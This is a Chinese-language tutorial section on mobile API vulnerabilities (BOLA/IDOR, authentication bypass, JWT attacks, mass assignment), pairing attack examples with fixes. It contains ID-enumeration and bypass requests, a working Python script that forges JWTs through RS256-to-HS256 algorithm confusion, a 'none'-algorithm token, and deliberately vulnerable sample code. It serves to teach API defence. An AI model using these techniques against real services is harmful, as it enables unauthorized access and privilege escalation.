# 移动 API 常见漏洞

### 5.1 BOLA / IDOR（越权访问）

**BOLA（Broken Object Level Authorization）** 即对象级授权失效，是 API 安全的首要威胁。攻击者通过修改请求中的对象 ID，访问无权访问的资源。

**漏洞示例**：

```http
# 正常请求 - 获取自己的订单
GET /api/v1/orders/1001 HTTP/1.1
Authorization: B eyer user_token_abc123

# 攻击者尝试遍历订单ID
GET /api/v1/orders/1002 HTTP/1.1
Authorization: Bearer user_token_abc123
# 如果服务端未校验订单所有者，则越权访问成功

# 批量遍历
GET /api/v1/orders/1003
GET /api/v1/orders/1004
GET /api/v1/orders/1005
```

**修复方案**：

```python
# 错误代码 - 仅验证Token，未验证资源所有权
@app.route('/api/v1/orders/<int:order_id>')
def get_order(order_id):
    user = verify_token(request.headers['Authorization'])
    order = Order.query.get(order_id)  # 未检查所有者
    return jsonify(order.to_dict())

# 正确代码 - 验证资源所有权
@app.route('/api/v1/orders/<int:order_id>')
@auth_required
def get_order(order_id):
    user = g.current_user
    order = Order.query.filter_by(
        id=order_id,
        user_id=user.id  # 确保订单属于当前用户
    ).first_or_404()
    return jsonify(order.to_dict())
```

### 5.2 认证绕过

**常见认证绕过方式**：

```http
# 方式1：修改 HTTP 方法
GET /api/v1/admin/users HTTP/1.1
# 改为
POST /api/v1/admin/users HTTP/1.1  # 某些实现只验证 GET

# 方式2：路径遍历
GET /api/v1/../v1/admin/users HTTP/1.1
GET /api/v1/users/../../admin/users HTTP/1.1

# 方式3：大小写绕过
GET /API/V1/Admin/Users HTTP/1.1
GET /api/v1/ADMIN/users HTTP/1.1

# 方式4：空字节绕过
GET /api/v1/admin/users%00 HTTP/1.1

# 方式5：参数污染
GET /api/v1/users?role=user&role=admin HTTP/1.1
```

### 5.3 JWT 攻击

JWT（JSON Web Token）由 Header、Payload、Signature 三部分组成，常见攻击面包括：

**（1）算法篡改攻击**

```python
# 攻击：将 RS256 算法改为 HS256，用公钥作为 HMAC 密钥
import base64
import json
import hmac
import hashlib

# 原始 JWT
original_jwt = "eyJhbGc..."

# 解码 Header
header = {"alg": "HS256", "typ": "JWT"}  # 将 RS256 改为 HS256
payload = {"sub": "admin", "role": "superadmin", "exp": 9999999999}

# 使用服务器的 RSA 公钥作为 HMAC 密钥签名
public_key = open("server_pub.pem").read()
encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
message = encoded_header + b'.' + encoded_payload
signature = hmac.new(public_key.encode(), message, hashlib.sha256).digest()
encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b'=')

forged_jwt = message.decode() + '.' + encoded_signature.decode()
# 如果服务端用公钥验证 HS256 签名，则伪造的 JWT 会被接受
```

**（2）None 算法绕过**

```json
// 将算法设置为 "none"，省略签名部分
{"alg": "none", "typ": "JWT"}
.
{"sub": "admin", "role": "superadmin"}
.
// 空签名
```

**JWT 安全最佳实践**：

- 禁止 `alg: none`
- 固定签名算法，不信任 Header 中的 `alg` 字段
- 设置合理的过期时间（exp）
- 使用强密钥（RS256 使用 2048+ 位密钥）
- 实施 Token 吊销机制

### 5.4 Mass Assignment（批量赋值）

```http
# 正常请求 - 更新用户昵称
PUT /api/v1/users/me HTTP/1.1
Content-Type: application/json

{
  "nickname": "NewName"
}

# 攻击 - 尝试修改角色和状态
PUT /api/v1/users/me HTTP/1.1
Content-Type: application/json

{
  "nickname": "NewName",
  "role": "admin",           # 提权
  "isVerified": true,        # 绕过验证
  "balance": 99999999        # 篡改余额
}
```

**修复方案 - 白名单更新**：

```python
# 正确做法 - 只允许更新白名单字段
ALLOWED_FIELDS = {'nickname', 'avatar', 'bio'}

@app.route('/api/v1/users/me', methods=['PUT'])
@auth_required
def update_profile():
    user = g.current_user
    data = request.get_json()
    
    # 过滤只允许更新的字段
    filtered = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}
    
    for key, value in filtered.items():
        setattr(user, key, value)
    
    db.session.commit()
    return jsonify(user.to_dict())
```

---

---

